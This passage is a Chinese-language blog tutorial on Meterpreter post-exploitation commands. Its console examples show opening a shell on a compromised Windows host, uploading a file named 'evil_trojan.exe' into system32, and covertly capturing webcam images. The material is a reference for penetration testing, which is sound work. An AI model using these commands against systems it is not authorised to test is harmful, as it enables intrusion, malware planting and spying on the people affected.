+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; &gt; resource resource.txt</span><br><span class="line">[*] Reading /root/resource.txt</span><br><span class="line">[*] Running ls</span><br><span class="line"></span><br><span class="line">Listing: C:\Documents and Settings\Administrator\Desktop</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">40777/rwxrwxrwx   0       dir   2012-02-29 16:41:29 -0500  .</span><br><span class="line">40777/rwxrwxrwx   0       dir   2012-02-02 12:24:40 -0500  ..</span><br><span class="line">100666/rw-rw-rw-  606     fil   2012-02-15 17:37:48 -0500  IDA Pro Free.lnk</span><br><span class="line">100777/rwxrwxrwx  681984  fil   2012-02-02 15:09:18 -0500  Sc303.exe</span><br><span class="line">100666/rw-rw-rw-  608     fil   2012-02-28 19:18:34 -0500  Shortcut to Ability Server.lnk</span><br><span class="line">100666/rw-rw-rw-  522     fil   2012-02-02 12:33:38 -0500  XAMPP Control Panel.lnk</span><br><span class="line"></span><br><span class="line">[*] Running background</span><br><span class="line"></span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf  exploit(handler) &gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="SEARCH"><a href="#SEARCH" class="headerlink" title="SEARCH"></a>SEARCH</h2><p>在目标机上搜索具体的文件，可以在整个系统中搜索，也可以在指定的目录下搜索，在创建文件模式时可以使用通配符。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; search</span><br><span class="line">[-] You must specify a valid file glob to search <span class="keyword">for</span>, e.g. &gt;search -f *.doc</span><br></pre></td></tr></table></figure>
+
+<p>参数:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File pattern:	 	May contain wildcards</span><br><span class="line">Search location:	Optional, <span class="keyword">if</span> none is given the whole system will be searched.</span><br></pre></td></tr></table></figure>
+
+<p>示例:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; search -f autoexec.bat</span><br><span class="line">Found 1 result...</span><br><span class="line">    c:\AUTOEXEC.BAT</span><br><span class="line">meterpreter &gt; search -f sea*.bat c:\\xamp\\</span><br><span class="line">Found 1 result...</span><br><span class="line">    c:\\xampp\perl\bin\search.bat (57035 bytes)</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="SHELL"><a href="#SHELL" class="headerlink" title="SHELL"></a>SHELL</h2><p>返回目标机上的一个标准的shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 39640 created.</span><br><span class="line">Channel 2 created.</span><br><span class="line">Microsoft Windows XP [Version 5.1.2600]</span><br><span class="line">(C) Copyright 1985-2001 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="UPLOAD"><a href="#UPLOAD" class="headerlink" title="UPLOAD"></a>UPLOAD</h2><p>上传文件到目标机上，同<strong>download</strong> 命令一样在路径中需要使用两个反斜杠：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload evil_trojan.exe c:\\windows\\system32</span><br><span class="line">[*] uploading  : evil_trojan.exe -&gt; c:\windows\system32</span><br><span class="line">[*] uploaded   : evil_trojan.exe -&gt; c:\windows\system32\evil_trojan.exe</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="WEBCAM-LIST"><a href="#WEBCAM-LIST" class="headerlink" title="WEBCAM_LIST"></a>WEBCAM_LIST</h2><p>列出当前目标机器上可用的Webcam设备。</p>
+<p>示例:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_list</span><br><span class="line">1: Creative WebCam NX Pro</span><br><span class="line">2: Creative WebCam NX Pro (VFW)</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="WEBCAM-SNAP"><a href="#WEBCAM-SNAP" class="headerlink" title="WEBCAM_SNAP"></a>WEBCAM_SNAP</h2><p>利用已连接的webcam设备在目标机上截屏并以随机文件名的jpg格式保存在本地当前工作目录。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_snap -h</span><br><span class="line">Usage: webcam_snap [options]</span><br><span class="line">Grab a frame from the specified webcam.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -h      Help Banner</span><br><span class="line">    -i   要使用的webcam设备的编号(Default: 1)</span><br><span class="line">    -p   jpg图片的路径 (Default: <span class="string">'gnFjTnzi.jpeg'</span>)</span><br><span class="line">    -q   jpg图片的质量 (Default: <span class="string">'50'</span>)</span><br><span class="line">    -v   是否自动查看图片 (Default: <span class="string">'true'</span>)</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<p>选项:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-h:	Displays the help information for the command</span><br><span class="line">-i opt:	If more then 1 web cam is connected, use this option to select the device to capture the</span><br><span class="line">        image from</span><br><span class="line">-p opt:	Change path and filename of the image to be saved</span><br><span class="line">-q opt:	The imagine quality, 50 being the default/medium setting, 100 being best quality</span><br><span class="line">-v opt:	By default the value is true, which opens the image after capture.</span><br></pre></td></tr></table></figure>
+
+<p>示例:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_snap -i 1 -v false</span><br><span class="line">[*] Starting...</span><br><span class="line">[+] Got frame</span><br><span class="line">[*] Stopped</span><br><span class="line">Webcam shot saved to: /root/Offsec/YxdhwpeQ.jpeg</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/meterpreter/" rel="tag"># meterpreter</a>
+            
+              <a href="/tags/Penetration/" rel="tag"># Penetration</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/12/28/pwn_tips/" rel="next" title="pwn tips in gdb">
+                  <i class="fa fa-chevron-left"></i> pwn tips in gdb
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2049/09/01/Note/" rel="prev" title="Notebook">
+                  Notebook <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="comments"></div>
+  
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#METERPRETER命令用法"><span class="nav-number">1.</span> <span class="nav-text">METERPRETER命令用法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HELP"><span class="nav-number">2.</span> <span class="nav-text">HELP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BACKGROUND"><span class="nav-number">3.</span> <span class="nav-text">BACKGROUND</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CAT"><span class="nav-number">4.</span> <span class="nav-text">CAT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CD-AND-PWD"><span class="nav-number">5.</span> <span class="nav-text">CD AND PWD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CLEAREV"><span class="nav-number">6.</span> <span class="nav-text">CLEAREV</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CLEAREV-1"><span class="nav-number">7.</span> <span class="nav-text">CLEAREV</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注意在操作Windows路径时应该使用两个反斜杠"><span class="nav-number">8.</span> <span class="nav-text">注意在操作Windows路径时应该使用两个反斜杠</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EDIT"><span class="nav-number">9.</span> <span class="nav-text">EDIT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXECUTE"><span class="nav-number">10.</span> <span class="nav-text">EXECUTE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GETUID"><span class="nav-number">11.</span> <span class="nav-text">GETUID</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HASHDUMP"><span class="nav-number">12.</span> <span class="nav-text">HASHDUMP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IDLETIME"><span class="nav-number">13.</span> <span class="nav-text">IDLETIME</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IPCONFIG"><span class="nav-number">14.</span> <span class="nav-text">IPCONFIG</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LPWD-AND-LCD"><span class="nav-number">15.</span> <span class="nav-text">LPWD AND LCD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LS"><span class="nav-number">16.</span> <span class="nav-text">LS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MIGRATE"><span class="nav-number">17.</span> <span class="nav-text">MIGRATE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PS"><span class="nav-number">18.</span> <span class="nav-text">PS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RESOURCE"><span class="nav-number">19.</span> <span class="nav-text">RESOURCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SEARCH"><span class="nav-number">20.</span> <span class="nav-text">SEARCH</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SHELL"><span class="nav-number">21.</span> <span class="nav-text">SHELL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#UPLOAD"><span class="nav-number">22.</span> <span class="nav-text">UPLOAD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEBCAM-LIST"><span class="nav-number">23.</span> <span class="nav-text">WEBCAM_LIST</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEBCAM-SNAP"><span class="nav-number">24.</span> <span class="nav-text">WEBCAM_SNAP</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Demen Lee">
+  <p class="site-author-name" itemprop="name">Demen Lee</p>
+  <div class="site-description" itemprop="description">Sharing, Communicating more, then moving on......</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">tags</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/spwpun" title="GitHub &rarr; https://github.com/spwpun" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:spwpun@gmail.com" title="E-Mail &rarr; mailto:spwpun@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://weibo.com/u/5536839794" title="Weibo &rarr; https://weibo.com/u/5536839794" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+    
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://whale3070.github.io" title="https://whale3070.github.io" rel="noopener" target="_blank">Whale3070</a>
+        </li>
+      
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-flag-checkered"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Spwpun</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a></div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a></div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.1"></script><script src="/js/motion.js?v=7.4.1"></script>
+<script src="/js/schemes/pisces.js?v=7.4.1"></script>
+
+<script src="/js/next-boot.js?v=7.4.1"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.1"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+<script>
+NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(item => {
+    return GUEST.includes(item);
+  });
+  new Valine({
+    el: '#comments',
+    verify: true,
+    notify: false,
+    appId: 'O9n8UnYXJ5M4s4QEumwRCwH9-gzGzoHsz',
+    appKey: 'qdSjFo9LUO20Ba6XRPMQGX7v',
+    placeholder: 'Leave something interesting......',
+    avatar: 'mm',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: true,
+    lang: '' || 'zh-cn',
+    path: location.pathname,
+    recordIP: false,
+    serverURLs: ''
+  });
+}, window.Valine);
+</script>
+
+</body>
+</html>
